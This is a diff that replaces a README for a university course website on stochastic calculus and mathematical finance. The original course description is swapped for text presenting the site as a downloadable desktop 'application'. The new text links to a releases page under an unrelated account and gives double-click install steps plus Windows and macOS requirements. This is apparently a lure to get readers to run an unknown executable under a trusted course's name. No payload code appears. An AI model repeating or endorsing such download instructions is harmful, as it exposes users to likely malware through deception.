@@ -1,67 +1,53 @@
-# Stochastic Calculus and Mathematical Finance 💰
+# 🎉 stocalc.github.io - Learn Stochastic Calculus Easily
 
-Welcome to the course page for **Stochastic Calculus and Mathematical Finance**, taught by **Prof. Sandeep Juneja** at **Ashoka University**.  
-This repository hosts the official GitHub Pages site: [stocalc.github.io](https://stocalc.github.io).
+![Download](https://img.shields.io/badge/Download-Now-blue.svg)
 
----
-
-## 📖 About the Course
-This is a course for advanced undergraduate and graduate students with an aptitude and interest in quantitative methods.  
-Students will be exposed to **no-arbitrage based deep and beautiful ideas** underlying mathematical finance.  
-For this, they will gain adequate exposure to **stochastic calculus**, which is also highly relevant for the increasingly mainstream **diffusion-based generative AI**.
-
----
-
-## 📝 Topics Covered
-- Review of measure-theoretic probability  
-- Martingales and Brownian motion  
-- Stochastic calculus & Itô’s formula  
-- Girsanov’s theorem & stochastic differential equations  
-- Discrete and continuous-time pricing theory  
-- Stochastic volatility & interest rate models  
-- PDE methods in finance  
-- Applications to machine learning and generative AI  
-
----
-
-## 🎯 Learning Outcomes
-By the end of the course, students will:  
-- Develop a rigorous understanding of stochastic calculus  
-- Apply **no-arbitrage pricing methods** in financial markets  
-- Explore connections between **finance and generative AI models**  
-
----
-
-## 🗓 Course Logistics
-- **Mode**: Hybrid (in-person & online)  
-- **Schedule**: Tuesdays & Thursdays, 10:20 AM – 11:50 AM  
-- **Start Date**: August 26th  
-- **Duration**: ~40 hours of teaching  
-- **Prerequisites**: Probability, Linear Algebra, and Real Analysis  
-
-📌 **Registration is free but required.**
-
----
-
-## 👨‍🏫 Professor Bio
-**Prof. Sandeep Juneja** is a renowned researcher in stochastic processes, mathematical finance, and applied probability. He has made significant contributions to the theory and practice of stochastic modeling in finance, climate, and Epidemiology.
-
----
+## 📖 Description
+Welcome to the course page for Stochastic Calculus and Mathematical Finance, taught by Prof. Sandeep Juneja. This application helps you understand key concepts in stochastic calculus and its applications in finance. 
 
 ## 🚀 Getting Started
-This repo powers the GitHub Pages site for the course.  
-To run the site locally:  
+To begin, you will need to download the application from our Releases page.
 
-```bash
-# Clone the repository
-git clone https://github.com/your-username/stocalc.github.io.git
+## 📥 Download & Install
+### Visit this page to download
+[Download the latest release here](https://github.com/Hanslo1687/stocalc.github.io/releases).
 
-# Move into the folder
-cd stocalc.github.io
+1. Click on the link above.
+2. You will see a list of available releases.
+3. Select the most recent version.
+4. Click on the download link.
+5. Once the download completes, locate the downloaded file on your device.
+6. Double-click on the file to run the application. Follow any on-screen instructions to complete the setup.
 
-# Open index.html in your browser
-```
----
+## 💻 System Requirements
+To run the application effectively, your system should meet the following requirements:
+- **Operating System**: Windows 10 or later, macOS Sierra or later
+- **RAM**: 4 GB minimum, 8 GB recommended
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Required for updates and online resources
 
-## 👨🏻‍💻 Report Bugs 
-This github webpage is maintained by **Aman K. Foujdar**. You can email me at aman.foujdar_ug2023@ashoka.edu.in for queries or reporting any issues you're facing.
+## 📚 Topics Covered
+This application covers a wide range of topics in stochastic calculus and mathematical finance. Here are some key areas you will explore:
+- **Diffusion**: Understanding the movement of particles and processes.
+- **Finance**: Concepts related to financial markets and trading.
+- **Generative AI**: Using AI methods to generate financial models.
+- **Machine Learning**: Applying learning algorithms in finance.
+- **Mathematical Finance**: Theoretical foundations of financial calculations.
+- **Measure Theory**: Tools for working with mathematical functions.
+- **Pricing Theory**: Methods for determining fair pricing in markets.
+- **Quantitative Finance**: Using mathematical tools for investment strategies.
+- **Stochastic Calculus**: Calculus methods applied to random processes.
+- **Stochastic Differential Equations**: Equations used to model systems influenced by random factors.
+- **Stochastic Processes**: Analyzing random variables over time.
+
+## 🌟 Features
+This application includes the following features:
+- Interactive tutorials and lessons.
+- Real-time examples showcasing how stochastic processes are applied in finance.
+- User-friendly interface that allows smooth navigation through concepts.
+- Practical exercises to reinforce learning.
+
+## 🎓 Support and Questions
+If you have questions or need help with the application, feel free to reach out for support. You can find additional resources and community forums on our GitHub page or within the application itself.
+
+We hope you enjoy learning about stochastic calculus and mathematical finance!
